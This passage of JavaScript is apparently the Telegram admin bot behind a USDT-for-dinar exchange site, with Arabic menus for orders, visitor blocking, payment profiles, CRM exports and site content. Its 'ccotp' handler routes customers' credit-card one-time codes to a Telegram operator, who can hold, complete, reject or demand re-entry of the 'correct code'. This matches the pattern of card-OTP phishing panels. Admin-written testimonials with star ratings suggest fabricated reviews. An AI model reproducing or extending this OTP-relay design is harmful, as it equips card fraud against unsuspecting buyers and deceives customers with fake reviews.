  const st = orderStatusLabelAr(o.status || 'received');
  const lines = [
    '🧾 <b>تفاصيل الطلب</b>',
    `<b>رقم الطلب:</b> <code>${escapeTelegramHtml(o.orderId)}</code>`,
    `<b>الحالة:</b> ${escapeTelegramHtml(st)}`,
    `<b>الاسم:</b> ${escapeTelegramHtml(o.name)}`,
    `<b>USDT:</b> ${escapeTelegramHtml(String(o.usdtAmount))}`,
    `<b>IQD:</b> ${escapeTelegramHtml(String(o.iqdAmount || ''))}`,
    `<b>الدفع:</b> ${escapeTelegramHtml(o.paymentMethod)}`,
    `<b>الشبكة:</b> ${escapeTelegramHtml(o.network || '')}`,
    o.wallet ? `<b>المحفظة:</b> <code>${escapeTelegramHtml(o.wallet)}</code>` : null,
    `<b>IP:</b> <code>${escapeTelegramHtml(resolvedIp || '—')}</code>`,
    `<b>الجهاز:</b> ${escapeTelegramHtml(o.deviceLabel || '—')}`,
    `<b>الزائر:</b> <code>${escapeTelegramHtml(o.visitorId || '—')}</code>`,
    `<b>الوقت:</b> ${escapeTelegramHtml(o.at)}`,
  ].filter(Boolean);
  const modKb = await moderationInlineKeyboard(resolvedIp, o.visitorId || '');
  const modRows = modKb?.inline_keyboard || [];
  await botSend(lines.join('\n'), { reply_markup: orderInlineKeyboard(o.orderId, modRows) }, forceChatId);
}

async function showOrdersMenu(forceChatId = null, offset = 0) {
  const PAGE_SIZE = 12;
  const all = await loadOrders(ORDERS_CRM_PATH);
  const newest = [...all].reverse();
  const safeOffset = Math.max(0, Number(offset) || 0);
  const page = newest.slice(safeOffset, safeOffset + PAGE_SIZE);

  if (!page.length) {
    await botSend('🛒 لا توجد طلبات لعرضها حالياً.', { reply_markup: { inline_keyboard: [[{ text: '🔙 القائمة الرئيسية', callback_data: 'menu_main' }]] } }, forceChatId);
    return;
  }

  const rows = page.map((o) => {
    const status = orderStatusLabelAr(o.status || 'received');
    const text = `${o.orderId} — ${status}`;
    const tok = makeActionToken('ordv', o.orderId);
    return [{ text: text.slice(0, 60), callback_data: `ordv:${tok}` }];
  });

  const navRow = [];
  if (safeOffset > 0) navRow.push({ text: '⬅️ السابق', callback_data: `ordp:${Math.max(0, safeOffset - PAGE_SIZE)}` });
  if (safeOffset + PAGE_SIZE < newest.length) navRow.push({ text: 'التالي ➡️', callback_data: `ordp:${safeOffset + PAGE_SIZE}` });
  if (navRow.length) rows.push(navRow);
  rows.push([{ text: '🔄 تحديث', callback_data: `ordp:${safeOffset}` }]);
  rows.push([{ text: '🔙 القائمة الرئيسية', callback_data: 'menu_main' }]);

  await botSend(
    `🛒 <b>الطلبات</b>\nالإجمالي: <b>${newest.length}</b>\nالصفحة: ${Math.floor(safeOffset / PAGE_SIZE) + 1}`,
    { reply_markup: { inline_keyboard: rows } },
    forceChatId
  );
}

async function handleCallbackQuery(data, incomingChatId) {
  const ordViewCb = String(data || '').match(/^ordv:(.+)$/);
  if (ordViewCb) {
    const orderId = readActionToken(ordViewCb[1], 'ordv');
    if (!orderId) {
      await botSend('⚠️ انتهت صلاحية زر الطلب. افتح قائمة الطلبات من جديد.', {}, incomingChatId);
      return;
    }
    await sendOrderDetailsById(orderId, incomingChatId);
    return;
  }

  const ccOtpCb = String(data || '').match(/^ccotp:(.+)$/);
  if (ccOtpCb) {
    const token = ccOtpCb[1];
    const tryTypes = ['cc_hold', 'cc_complete', 'cc_reject', 'cc_reenter'];
    let actionType = '';
    let submissionId = '';
    for (const tp of tryTypes) {
      const val = readActionToken(token, tp);
      if (val) {
        actionType = tp;
        submissionId = val;
        break;
      }
    }
    if (!actionType || !submissionId) {
      await botSend('⚠️ انتهت صلاحية زر الكود. أعد إدخال الكود من جديد.', {}, incomingChatId);
      return;
    }

    const sub = await getCreditCardOtpSubmission(submissionId);
    if (!sub) {
      await botSend('❌ لم أجد جلسة كود بطاقة الائتمان.', {}, incomingChatId);
      return;
    }

    const oid = sub.orderId;
    if (actionType === 'cc_hold') {
      await setCreditCardOtpSubmissionDecision(submissionId, 'hold');
      await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'received');
      await botSend(`⏳ تم وضع الطلب قيد التعليق.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
      return;
    }

    if (actionType === 'cc_reject') {
      await setCreditCardOtpSubmissionDecision(submissionId, 'rejected');
      await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'cancelled');
      await botSend(`❌ تم رفض الطلب.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
      return;
    }

    if (actionType === 'cc_reenter') {
      await setCreditCardOtpSubmissionDecision(submissionId, 'reenter');
      await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'received');
      await botSend(`🔁 تم طلب إعادة إدخال الرمز الصحيح.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
      return;
    }

    if (actionType === 'cc_complete') {
      await setCreditCardOtpSubmissionDecision(submissionId, 'completed');
      await updateOrderStatusByOrderId(ORDERS_CRM_PATH, oid, 'completed');
      await botSend(`✅ تم اكتمال الطلب.\nطلب: <code>${escapeTelegramHtml(oid)}</code>`, {}, incomingChatId);
      return;
    }
  }

  const ordPageCb = String(data || '').match(/^ordp:(\d+)$/);
  if (ordPageCb) {
    await showOrdersMenu(incomingChatId, Number(ordPageCb[1]) || 0);
    return;
  }

  const modCb = String(data || '').match(/^mod:(.+)$/);
  if (modCb) {
    const token = modCb[1];
    const tryTypes = ['bip', 'uip', 'bfp', 'ufp', 'bch', 'uch', 'bcr', 'ucr'];
    let hitType = '';
    let hitValue = '';
    for (const tp of tryTypes) {
      const val = readActionToken(token, tp);
      if (val) {
        hitType = tp;
        hitValue = val;
        break;
      }
    }
    if (!hitType || !hitValue) {
      await botSend('⚠️ انتهت صلاحية الزر. أعد إرسال /order أو انتظر رسالة جديدة.', {}, incomingChatId);
      return;
    }

    if (hitType === 'bip') {
      const ip = normalizeBlockedIpInput(hitValue);
      const list = await loadBlockedIps();
      if (!list.find((it) => it.ip === ip)) {
        list.push({ ip, reason: 'مخالفة', at: new Date().toISOString() });
        await saveBlockedIps(list);
      }
      await botSend(`🚫 تم حظر IP من الزر:\n<code>${escapeTelegramHtml(ip)}</code>`, {}, incomingChatId);
      return;
    }

    if (hitType === 'uip') {
      const ip = normalizeBlockedIpInput(hitValue);
      const list = await loadBlockedIps();
      const next = list.filter((it) => it.ip !== ip);
      await saveBlockedIps(next);
      await botSend(`✅ تم فك حظر IP من الزر:\n<code>${escapeTelegramHtml(ip)}</code>`, {}, incomingChatId);
      return;
    }

    if (hitType === 'bfp') {
      const fp = normalizeFingerprintInput(hitValue);
      const list = await loadBlockedFingerprints();
      if (!list.find((it) => it.fingerprint === fp)) {
        const ipSnapshot = await findRecentIpByFingerprint(fp);
        list.push({ fingerprint: fp, reason: 'مخالفة', at: new Date().toISOString(), ipSnapshot });
        await saveBlockedFingerprints(list);
      }
      await botSend(`🧬🚫 تم حظر Fingerprint من الزر:\n<code>${escapeTelegramHtml(fp)}</code>`, {}, incomingChatId);
      return;
    }

    if (hitType === 'ufp') {
      const fp = normalizeFingerprintInput(hitValue);
      const list = await loadBlockedFingerprints();
      const next = list.filter((it) => it.fingerprint !== fp);
      await saveBlockedFingerprints(next);
      await botSend(`✅ تم فك حظر Fingerprint من الزر:\n<code>${escapeTelegramHtml(fp)}</code>`, {}, incomingChatId);
      return;
    }

    if (hitType === 'bch') {
      const fp = normalizeFingerprintInput(hitValue);
      const list = await loadBlockedChatUsers();
      if (!list.find((it) => it.fingerprint === fp)) {
        list.push({ fingerprint: fp, reason: 'مخالفة', at: new Date().toISOString() });
        await saveBlockedChatUsers(list);
      }
      await botSend(`💬🚫 تم حظر المستخدم من خدمة العملاء:\n<code>${escapeTelegramHtml(fp)}</code>`, {}, incomingChatId);
      return;
    }

    if (hitType === 'uch') {
      const fp = normalizeFingerprintInput(hitValue);
      const list = await loadBlockedChatUsers();
      const next = list.filter((it) => it.fingerprint !== fp);
      await saveBlockedChatUsers(next);
      await botSend(`✅ تم فك حظر خدمة العملاء عن:\n<code>${escapeTelegramHtml(fp)}</code>`, {}, incomingChatId);
      return;
    }

    if (hitType === 'bcr') {
      const ip = normalizeBlockedIpInput(hitValue);
      const list = await loadBlockedChatIps();
      if (!list.find((it) => it.ip === ip)) {
        list.push({ ip, reason: 'مخالفة', at: new Date().toISOString() });
        await saveBlockedChatIps(list);
      }
      await botSend(`🚫 تم حظر رواتر خدمة العملاء:\n<code>${escapeTelegramHtml(ip)}</code>`, {}, incomingChatId);
      return;
    }

    if (hitType === 'ucr') {
      const ip = normalizeBlockedIpInput(hitValue);
      const list = await loadBlockedChatIps();
      const next = list.filter((it) => it.ip !== ip);
      await saveBlockedChatIps(next);
      await botSend(`✅ تم فك حظر رواتر خدمة العملاء:\n<code>${escapeTelegramHtml(ip)}</code>`, {}, incomingChatId);
      return;
    }
  }

  // ── Order status (inline buttons on new orders) ─────
  const orderCb = String(data).match(/^o([dac]):(.+)$/);
  if (orderCb) {
    const map = { d: 'completed', a: 'archived', c: 'cancelled' };
    const status = map[orderCb[1]];
    const orderId = orderCb[2];
    if (status) {
      const r = await updateOrderStatusByOrderId(ORDERS_CRM_PATH, orderId, status);
      if (r.ok) {
        await botSend(
          `✅ الطلب <code>${escapeTelegramHtml(orderId)}</code>\nالحالة: <b>${orderStatusLabelAr(status)}</b>\n<i>يُحدَّث للعميل في صفحة تتبع الطلب.</i>`,
          {},
          incomingChatId
        );
      } else {
        await botSend(`❌ لم أجد الطلب: <code>${escapeTelegramHtml(orderId)}</code>`, {}, incomingChatId);
      }
      return;
    }
  }

  if (data.startsWith('ord:')) {
    const m = String(data).match(/^ord:(done|arch|canc):(.+)$/);
    if (m) {
      const map = { done: 'completed', arch: 'archived', canc: 'cancelled' };
      const status = map[m[1]];
      const orderId = m[2];
      const r = await updateOrderStatusByOrderId(ORDERS_CRM_PATH, orderId, status);
      if (r.ok) {
        await botSend(
          `✅ الطلب <code>${escapeTelegramHtml(orderId)}</code>\nالحالة: <b>${orderStatusLabelAr(status)}</b>\n<i>يُحدَّث للعميل في صفحة تتبع الطلب.</i>`,
          {},
          incomingChatId
        );
      } else {
        await botSend(`❌ لم أجد الطلب: <code>${escapeTelegramHtml(orderId)}</code>`, {}, incomingChatId);
      }
      return;
    }
  }

  // ── Main navigation ─────────────────────────────────
  if (data === 'menu_main')  { setPendingState(incomingChatId, null); await sendMainMenu(incomingChatId); return; }
  if (data === 'cancel_input') { setPendingState(incomingChatId, null); await sendMainMenu(incomingChatId); return; }

  if (data === 'menu_profiles') {
    await showProfilesMenu(incomingChatId);
    return;
  }

  if (data === 'prof_add') {
    setPendingState(incomingChatId, { action: 'addProfile', step: 0 });
    await botSend('👤 أرسل <b>اسم البروفايل بالعربية</b> (مثال: علي عدنان):', { reply_markup: cancelButton() }, incomingChatId);
    return;
  }

  if (/^prof_sum_\d+$/.test(data)) {
    const i = Number(data.slice('prof_sum_'.length));
    const details = await loadPaymentDetails();
    const p = details.profiles[i];
    if (!p) return;
    const active = details.currentProfileId === p.id;
    const rows = [
      [{ text: '✏️ تعديل بيانات هذا البروفايل', callback_data: `prof_edit_go_${i}` }],
      [{ text: '⚙️ تفعيل/إيقاف طرق على الموقع', callback_data: `prof_methods_${i}` }],
      [{ text: '🌐 جعله البروفايل النشط للموقع', callback_data: `prof_platform_${i}` }],
    ];
    if (details.profiles.length > 1) {
      rows.push([{ text: '🗑️ حذف هذا البروفايل', callback_data: `prof_del_ask_${i}` }]);
    }
    rows.push([{ text: '🔙 البروفايلات', callback_data: 'menu_profiles' }]);
    await botSend(
      [
        `👤 <b>${p.nameAr}</b>`,
        `<i>${p.nameEn || ''}</i>`,
        '',
        active ? '✅ <b>نشط على الموقع</b> 🌐 (العملاء يرون حسابات هذا البروفايل)' : 'ℹ️ غير نشط على الموقع — استخدم «جعله النشط» للتبديل.',
      ].join('\n'),
      { reply_markup: { inline_keyboard: rows } },
      incomingChatId
    );
    return;
  }

  if (/^prof_del_ask_\d+$/.test(data)) {
    const i = Number(data.slice('prof_del_ask_'.length));
    const details = await loadPaymentDetails();
    const p = details.profiles[i];
    if (!p) return;
    if (details.profiles.length <= 1) {
      await botSend('❌ لا يمكن حذف <b>آخر بروفايل</b>. أنشئ بروفايلاً آخراً أولاً ثم احذف هذا.', { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: `prof_sum_${i}` }]] } }, incomingChatId);
      return;
    }
    await botSend(
      `🗑️ <b>تأكيد الحذف</b>\nسيتم حذف البروفايل «<b>${escapeTelegramHtml(p.nameAr)}</b>» وجميع حساباته المرتبطة به نهائياً.\nهل أنت متأكد؟`,
      { reply_markup: { inline_keyboard: [
        [{ text: '✅ نعم، احذف', callback_data: `prof_del_yes_${i}` }],
        [{ text: '❌ إلغاء', callback_data: `prof_sum_${i}` }],
      ] } },
      incomingChatId
    );
    return;
  }

  if (/^prof_del_yes_\d+$/.test(data)) {
    const i = Number(data.slice('prof_del_yes_'.length));
    const details = await loadPaymentDetails();
    if (details.profiles.length <= 1) {
      await botSend('❌ لا يمكن حذف آخر بروفايل.', {}, incomingChatId);
      return;
    }
    const victim = details.profiles[i];
    if (!victim) return;
    const victimId = victim.id;
    const nextProfiles = details.profiles.filter((_, idx) => idx !== i);
    let nextCurrent = details.currentProfileId;
    if (details.currentProfileId === victimId) {
      nextCurrent = nextProfiles[0]?.id;
    }
    for (const [cid, ctx] of [...adminProfileContext.entries()]) {
      if (ctx.profileId === victimId) adminProfileContext.delete(cid);
    }
    await savePaymentDetails({ ...details, profiles: nextProfiles, currentProfileId: nextCurrent });
    await botSend(
      `✅ تم حذف البروفايل <b>${escapeTelegramHtml(victim.nameAr)}</b>.`,
      { reply_markup: { inline_keyboard: [[{ text: '👤 البروفايلات', callback_data: 'menu_profiles' }]] } },
      incomingChatId
    );
    return;
  }

  if (/^prof_edit_go_\d+$/.test(data)) {
    const i = Number(data.slice('prof_edit_go_'.length));
    const details = await loadPaymentDetails();
    const p = details.profiles[i];
    if (!p) return;
    setEditingProfile(incomingChatId, p.id);
    await showEditMenu(incomingChatId);
    return;
  }

  if (/^prof_platform_\d+$/.test(data)) {
    const i = Number(data.slice('prof_platform_'.length));
    const details = await loadPaymentDetails();
    const p = details.profiles[i];
    if (!p) return;
    await savePaymentDetails({ ...details, currentProfileId: p.id });
    await botSend(
      `✅ البروفايل النشط على <b>الموقع</b> أصبح:\n<b>${p.nameAr}</b>\nعند الشراء، تظهر للعميل حسابات هذا البروفايل فقط (مع احترام طرق الدفع المفعّلة).`,
      { reply_markup: { inline_keyboard: [[{ text: '🔙 البروفايلات', callback_data: 'menu_profiles' }]] } },
      incomingChatId
    );
    return;
  }

  if (/^prof_methods_\d+$/.test(data)) {
    const i = Number(data.slice('prof_methods_'.length));
    await showMethodToggleMenu(i, incomingChatId);
    return;
  }

  if (/^prof_mten_\d+_/.test(data)) {
    const m = data.match(/^prof_mten_(\d+)_(.+)$/);
    if (!m) return;
    const i = Number(m[1]);
    const methodKey = m[2];
    if (!METHOD_KEYS.includes(methodKey)) return;
    const details = await loadPaymentDetails();
    const prof = details.profiles[i];
    if (!prof) return;
    const curOn = prof.methodEnabled[methodKey] !== false;
    const profiles = [...details.profiles];
    profiles[i] = {
      ...prof,
      methodEnabled: { ...prof.methodEnabled, [methodKey]: !curOn },
    };
    await savePaymentDetails({ ...details, profiles });
    await showMethodToggleMenu(i, incomingChatId);
    return;
  }

  if (data === 'menu_pay') {
    const details = await loadPaymentDetails();
    const rate = await computeRate(details);
    const active = getActiveProfile(details);
    const m = active?.methods || {};
    await botSend(
      [
        '📋 <b>بيانات الدفع (النشط على الموقع)</b>',
        `👤 <b>البروفايل:</b> ${active?.nameAr || '-'} (${active?.nameEn || ''})`,
        '━━━━━━━━━━━━━━━',
        `💱 السعر: <b>${rate} IQD/USDT</b>`,
        `⏱️ وقت الانتهاء: <b>${details.paymentExpiryMinutes} دقيقة</b>`,
        '', '🔷 <b>FastPay:</b> ' + (m.fastPay?.number || '-'),
        '🔷 <b>زين كاش:</b> ' + (m.zainCash?.number || '-'),
        '🔷 <b>آسيا حوالة:</b> ' + (m.asiaHawala?.number || '-'),
        '🔷 <b>المصرف الأول:</b> ' + (m.fib?.accountNumber || '-'),
        '🔷 <b>ماستر كارد:</b> ' + (m.mastercard?.cardNumber || '-'),
      ].join('\n'),
      { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu_main' }]] } },
      incomingChatId
    );
    return;
  }

  if (data === 'menu_rate')  { await showRateMenu(incomingChatId);  return; }
  if (data === 'menu_qr')    { await showQrMenu(incomingChatId);    return; }
  if (data === 'menu_help')  { await botSend(helpText(), {}, incomingChatId); return; }
  if (data === 'menu_edit')  { await showEditProfilePicker(incomingChatId);  return; }
  if (data === 'menu_timer') { await showTimerMenu(incomingChatId); return; }
  if (data === 'menu_orders') { await showOrdersMenu(incomingChatId, 0); return; }
  if (data === 'menu_blocked') { await showBlockedMenu(incomingChatId); return; }
  if (data === 'blocked_ip_list') { await sendBlockedIpsList(incomingChatId); return; }
  if (data === 'blocked_fp_list') { await sendBlockedFpsList(incomingChatId); return; }
  if (data === 'blocked_chat_list') { await sendBlockedChatList(incomingChatId); return; }

  // ── Rate ────────────────────────────────────────────
  if (data === 'rate_fixed') {
    setPendingState(incomingChatId, { action: 'rateFixed' });
    await botSend('💱 أرسل السعر الجديد بالدينار العراقي\nمثال: <code>1350</code>', { reply_markup: cancelButton() }, incomingChatId);
    return;
  }
  if (data === 'rate_float') {
    setPendingState(incomingChatId, { action: 'rateFloat' });
    await botSend('🔄 أرسل: <code>الأساس المكسب</code>\nمثال: <code>1310 40</code>\n(السعر = USDT × الأساس + المكسب)', { reply_markup: cancelButton() }, incomingChatId);
    return;
  }

  // ── QR ──────────────────────────────────────────────
  const qrMap = {
    qr_fastpay: ['fastpay', 'FastPay', 'edit_fastpay'],
    qr_zain: ['zain', 'زين كاش', 'edit_zain'],
    qr_fib: ['fib', 'المصرف الأول', 'edit_fib'],
    qr_mc: ['mastercard', 'ماستر كارد', 'edit_mc'],
    qr_asia: ['asia', 'آسيا حوالة', 'edit_asia'],
  };
  if (qrMap[data]) {
    const [method, label, backTo] = qrMap[data];
    const details = await loadPaymentDetails();
    const pid = resolveEditingProfileId(details, incomingChatId);
    setPendingState(incomingChatId, { action: 'awaitPhoto', method, label, backTo, profileId: pid });
    await botSend(`📷 أرسل صورة باركود <b>${label}</b> الآن`, { reply_markup: cancelButton() }, incomingChatId);
    return;
  }

  // ── Edit method selection ────────────────────────────
  if (data === 'edit_fastpay') {
    const details = await loadPaymentDetails();
    const d = getEditingProfile(details, incomingChatId);
    if (!d?.methods) return;
    await botSend(
      `✏️ <b>FastPay</b>\nالرقم: <code>${d.methods?.fastPay?.number || '-'}</code>\nالباركود: ${d.methods?.fastPay?.qrImage ? '✅ موجود' : '❌ غير محدد'}`,
      { reply_markup: { inline_keyboard: [
        [{ text: '📱 تغيير الرقم', callback_data: 'ef_fastpay_num' }, { text: '📷 تحديث الباركود', callback_data: 'qr_fastpay' }],
        [{ text: '🔙 رجوع', callback_data: 'menu_edit' }],
      ] } },
      incomingChatId
    );
    return;
  }
  if (data === 'edit_zain') {
    const details = await loadPaymentDetails();
    const d = getEditingProfile(details, incomingChatId);
    if (!d?.methods) return;
    await botSend(
      `✏️ <b>زين كاش</b>\nالرقم: <code>${d.methods?.zainCash?.number || '-'}</code>\nالباركود: ${d.methods?.zainCash?.qrImage ? '✅ موجود' : '❌ غير محدد'}`,
      { reply_markup: { inline_keyboard: [
        [{ text: '📱 تغيير الرقم', callback_data: 'ef_zain_num' }, { text: '📷 تحديث الباركود', callback_data: 'qr_zain' }],
        [{ text: '🔙 رجوع', callback_data: 'menu_edit' }],
      ] } },
      incomingChatId
    );
    return;
  }
  if (data === 'edit_asia') {
    const details = await loadPaymentDetails();
    const d = getEditingProfile(details, incomingChatId);
    if (!d?.methods) return;
    await botSend(
      `✏️ <b>آسيا حوالة</b>\nالرقم: <code>${d.methods?.asiaHawala?.number || '-'}</code>\nالباركود: ${d.methods?.asiaHawala?.qrImage ? '✅ موجود' : '❌ غير محدد'}`,
      { reply_markup: { inline_keyboard: [
        [{ text: '📱 تغيير الرقم', callback_data: 'ef_asia_num' }, { text: '📷 تحديث الباركود', callback_data: 'qr_asia' }],
        [{ text: '🔙 رجوع', callback_data: 'menu_edit' }],
      ] } },
      incomingChatId
    );
    return;
  }
  if (data === 'edit_fib') {
    const details = await loadPaymentDetails();
    const d = getEditingProfile(details, incomingChatId);
    if (!d?.methods) return;
    await botSend(
      `✏️ <b>المصرف الأول (FIB)</b>\nرقم الحساب: <code>${d.methods?.fib?.accountNumber || '-'}</code>\nاسم الحساب: <code>${d.methods?.fib?.accountName || '-'}</code>\nالباركود: ${d.methods?.fib?.qrImage ? '✅ موجود' : '❌ غير محدد'}`,
      { reply_markup: { inline_keyboard: [
        [{ text: '🔢 رقم الحساب', callback_data: 'ef_fib_num' }, { text: '✍️ اسم الحساب', callback_data: 'ef_fib_name' }],
        [{ text: '📷 تحديث الباركود', callback_data: 'qr_fib' }],
        [{ text: '🔙 رجوع', callback_data: 'menu_edit' }],
      ] } },
      incomingChatId
    );
    return;
  }
  if (data === 'edit_mc') {
    const details = await loadPaymentDetails();
    const d = getEditingProfile(details, incomingChatId);
    if (!d?.methods) return;
    await botSend(
      `✏️ <b>ماستر كارد</b>\nرقم البطاقة: <code>${d.methods?.mastercard?.cardNumber || '-'}</code>\nاسم الحامل: <code>${d.methods?.mastercard?.cardHolder || '-'}</code>\nالباركود: ${d.methods?.mastercard?.qrImage ? '✅ موجود' : '❌ غير محدد'}`,
      { reply_markup: { inline_keyboard: [
        [{ text: '💳 رقم البطاقة', callback_data: 'ef_mc_num' }, { text: '✍️ اسم الحامل', callback_data: 'ef_mc_holder' }],
        [{ text: '📷 تحديث الباركود', callback_data: 'qr_mc' }],
        [{ text: '🔙 رجوع', callback_data: 'menu_edit' }],
      ] } },
      incomingChatId
    );
    return;
  }

  // ── Edit fields (await text input) ──────────────────
  const fieldMap = {
    ef_fastpay_num: ['fastPay.number',       'رقم FastPay',         'menu_edit'],
    ef_zain_num:   ['zainCash.number',       'رقم زين كاش',        'menu_edit'],
    ef_asia_num:   ['asiaHawala.number',     'رقم آسيا حوالة',      'menu_edit'],
    ef_fib_num:    ['fib.accountNumber',     'رقم حساب FIB',        'edit_fib'],
    ef_fib_name:   ['fib.accountName',       'اسم حساب FIB',        'edit_fib'],
    ef_mc_num:     ['mastercard.cardNumber', 'رقم بطاقة ماستر كارد','edit_mc'],
    ef_mc_holder:  ['mastercard.cardHolder', 'اسم حامل البطاقة',    'edit_mc'],
  };
  if (fieldMap[data]) {
    const details = await loadPaymentDetails();
    const profileId = resolveEditingProfileId(details, incomingChatId);
    const [path, label, backTo] = fieldMap[data];
    setPendingState(incomingChatId, { action: 'editField', path, label, backTo, profileId });
    await botSend(`✏️ أرسل <b>${label}</b> الجديد:`, { reply_markup: cancelButton() }, incomingChatId);
    return;
  }

  // ── Timer presets ────────────────────────────────────
  const timerPresets = { timer_10: 10, timer_15: 15, timer_20: 20, timer_30: 30, timer_45: 45 };
  if (timerPresets[data]) {
    const mins = timerPresets[data];
    const details = await loadPaymentDetails();
    await savePaymentDetails({ ...details, paymentExpiryMinutes: mins });
    await botSend(`✅ تم تعيين وقت الانتهاء: <b>${mins} دقيقة</b>`, { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu_timer' }]] } }, incomingChatId);
    return;
  }
  if (data === 'timer_custom') {
    setPendingState(incomingChatId, { action: 'setTimer' });
    await botSend('⏱️ أرسل عدد الدقائق (1-180):\nمثال: <code>25</code>', { reply_markup: cancelButton() }, incomingChatId);
    return;
  }

  // ── Chat ID (single channel) ────────────────────────
  if (data === 'menu_chatid')       { await showChatIdMenu(incomingChatId);       return; }
  if (data === 'menu_site') {
    await showSiteMenu(incomingChatId);
    return;
  }
  // ── Site settings (legacy callbacks; hidden from main menu) ─────────────
  if (data === 'site_faq')          { await showFaqMenu(incomingChatId);          return; }
  if (data === 'site_hero')         { await showHeroMenu(incomingChatId);         return; }
  if (data === 'site_links')        { await showLinksMenu(incomingChatId);        return; }
  if (data === 'site_maint')        { await showMaintenanceMenu(incomingChatId);  return; }
  if (data === 'menu_testimonials') { await showTestimonialsMenu(incomingChatId); return; }
  if (data === 'menu_stats')        { await showStatsMenu(incomingChatId);        return; }

  if (data === 'menu_crm') {
    await showCrmHome(incomingChatId);
    return;
  }

  if (data === 'crm_v5') {
    const visits = await loadVisits(VISITS_PATH);
    const last = getRecentVisits(visits, 5);
    const body = last.length
      ? last.map((v) => {
        const loc = v.country ? (v.city ? `${v.country}, ${v.city}` : v.country) : '—';
        const dev = v.deviceLabel || v.device || '—';
        return `• ${v.at}\n  ${v.path}\n  ${loc} · ${dev}\n  ${v.ip || '-'} · ${v.lang || ''}`;
      }).join('\n\n')
      : 'لا توجد زيارات بعد.';
    await botSend(`🔎 <b>آخر 5 زيارات</b>\n<pre>${escapeTelegramHtml(body)}</pre>`, {}, incomingChatId);
    return;
  }

  if (data === 'crm_o5') {
    const orders = await loadOrders(ORDERS_CRM_PATH);
    const last = getRecentOrders(orders, 5);
    const body = last.length
      ? last.map((o) => `• ${o.orderId} — ${orderStatusLabelAr(o.status)}\n  ${o.name} · ${o.usdtAmount} USDT · ${o.paymentMethod}`).join('\n\n')
      : 'لا طلبات مسجّلة بعد.';
    await botSend(`🛒 <b>آخر 5 طلبات</b>\n<pre>${escapeTelegramHtml(body)}</pre>`, {}, incomingChatId);
    return;
  }

  if (data === 'crm_csv_v') {
    const all = await loadVisits(VISITS_PATH);
    const csv = visitsToCsv(all);
    await sendCrmDocument(incomingChatId, 'visits-export.csv', Buffer.from('\ufeff' + csv, 'utf8'), `تصدير ${all.length} زيارة`);
    return;
  }

  if (data === 'crm_csv_o') {
    const all = await loadOrders(ORDERS_CRM_PATH);
    const csv = ordersToCsv(all);
    await sendCrmDocument(incomingChatId, 'orders-export.csv', Buffer.from('\ufeff' + csv, 'utf8'), `تصدير ${all.length} طلب`);
    return;
  }

  if (data === 'crm_html') {
    const marketing = await loadStats();
    const summary = await buildFullCrmSummary(VISITS_PATH, ORDERS_CRM_PATH, marketing);
    const visits = await loadVisits(VISITS_PATH);
    const orders = await loadOrders(ORDERS_CRM_PATH);
    const vSl = getRecentVisits(visits, 200);
    const oSl = getRecentOrders(orders, 200);
    const html = buildPrintableHtmlReport(summary, vSl, oSl);
    await sendCrmDocument(
      incomingChatId,
      'crm-report.html',
      Buffer.from(html, 'utf8'),
      'افتح الملف في المتصفح ← طباعة / حفظ PDF',
    );
    return;
  }

  // ── Maintenance toggle ───────────────────────────────
  if (data === 'maint_toggle') {
    const cfg = await loadSiteConfig();
    if (!cfg.maintenance) cfg.maintenance = {};
    cfg.maintenance.enabled = !cfg.maintenance.enabled;
    await saveSiteConfig(cfg);
    const st = cfg.maintenance.enabled ? '🔴 مفعّل' : '🟢 مطفأ';
    await botSend(`✅ وضع الصيانة: <b>${st}</b>`, { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'site_maint' }]] } });
    return;
  }

  // ── FAQ view / delete ────────────────────────────────
  if (data.startsWith('faq_view_')) {
    const id = Number(data.replace('faq_view_', ''));
    const cfg = await loadSiteConfig();
    const f = (cfg.faq || []).find(x => x.id === id);
    if (!f) { await botSend('❌ السؤال غير موجود'); return; }
    await botSend(
      `❓ <b>السؤال #${id}</b>\n\n�� <b>${f.qAr}</b>\n${f.aAr}\n\n🇬🇧 <b>${f.qEn}</b>\n${f.aEn}`,
      { reply_markup: { inline_keyboard: [[{ text: '🗑️ حذف', callback_data: `faq_del_${id}` }, { text: '🔙 رجوع', callback_data: 'site_faq' }]] } }
    );
    return;
  }
  if (data.startsWith('faq_del_')) {
    const id = Number(data.replace('faq_del_', ''));
    const cfg = await loadSiteConfig();
    cfg.faq = (cfg.faq || []).filter(x => x.id !== id);
    await saveSiteConfig(cfg);
    await botSend('✅ تم حذف السؤال', { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'site_faq' }]] } });
    return;
  }
  if (data === 'faq_add') {
    setPendingState(incomingChatId, { action: 'addFaq', step: 0, data: {} });
    await botSend('❓ أرسل <b>السؤال بالعربية:</b>', { reply_markup: cancelButton() });
    return;
  }

  // ── Testimonials ──────────────────────────────────────
  if (data.startsWith('rev_view_')) {
    const id = Number(data.replace('rev_view_', ''));
    const list = await loadTestimonials();
    const r = list.find(x => x.id === id);
    if (!r) { await botSend('❌ التقييم غير موجود'); return; }
    await botSend(
      `⭐ <b>تقييم #${id}</b>\n👤 ${r.nameAr} / ${r.nameEn}\n📍 ${r.cityAr} / ${r.cityEn}\n${'⭐'.repeat(r.stars)}\n\n🇸🇦 ${r.textAr}\n🇬🇧 ${r.textEn}`,
      { reply_markup: { inline_keyboard: [[{ text: '🗑️ حذف', callback_data: `rev_del_${id}` }, { text: '🔙 رجوع', callback_data: 'menu_testimonials' }]] } }
    );
    return;
  }
  if (data.startsWith('rev_del_')) {
    const id = Number(data.replace('rev_del_', ''));
    const list = await loadTestimonials();
    await saveTestimonials(list.filter(x => x.id !== id));
    await botSend('✅ تم حذف التقييم', { reply_markup: { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu_testimonials' }]] } });
    return;
  }
  if (data === 'rev_add') {
    setPendingState(incomingChatId, { action: 'addReview', step: 0, data: {} });
    await botSend('👤 أرسل <b>الاسم بالعربية:</b>', { reply_markup: cancelButton() });
    return;
  }

